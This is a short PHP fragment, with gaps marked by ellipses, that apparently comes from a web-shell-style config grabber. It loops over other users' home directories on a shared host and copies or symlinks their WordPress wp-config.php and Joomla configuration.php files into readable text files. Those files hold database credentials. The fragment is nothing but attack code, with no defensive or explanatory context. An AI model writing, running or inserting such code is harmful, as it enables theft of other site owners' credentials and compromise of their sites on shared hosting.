...
copy('/home/www/'.$user.'/public_html/wp-config.php','WORDPRESS.txt');
copy('/home/www/'.$user.'/public_html/configuration.php','JOOMLA.txt');
...
symlink('/home/www/'.$user.'/public_html/wp-config.php','WORDPRESS.txt');
symlink('/home/www/'.$user.'/public_html/configuration.php','JOOMLA.txt');
